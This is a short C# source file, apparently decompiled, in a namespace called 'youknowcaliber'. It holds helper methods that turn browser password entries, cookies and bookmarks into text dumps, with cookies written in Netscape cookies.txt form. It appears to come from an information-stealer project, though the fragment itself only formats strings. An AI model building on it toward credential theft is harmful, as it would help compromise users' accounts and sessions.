﻿using System;

namespace youknowcaliber
{
	internal sealed class BrowserUtils
	{
		public static string FormatPassword(Password pPassword)
		{
			return string.Format("Hostname: {0}\nUsername: {1}\nPassword: {2}\n\n", pPassword.sUrl, pPassword.sUsername, pPassword.sPassword);
		}

		public static string FormatCookie(Cookie cCookie)
		{
			return string.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", new object[]
			{
				cCookie.sHostKey,
				cCookie.sPath,
				cCookie.sExpiresUtc,
				cCookie.sName,
				cCookie.sValue
			});
		}

		public static string FormatBookmark(Bookmark bBookmark)
		{
			bool flag = !string.IsNullOrEmpty(bBookmark.sUrl);
			string result;
			if (flag)
			{
				result = string.Format("### {0} ### ({1})\n", bBookmark.sTitle, bBookmark.sUrl);
			}
			else
			{
				result = string.Format("### {0} ###\n", bBookmark.sTitle);
			}
			return result;
		}
	}
}
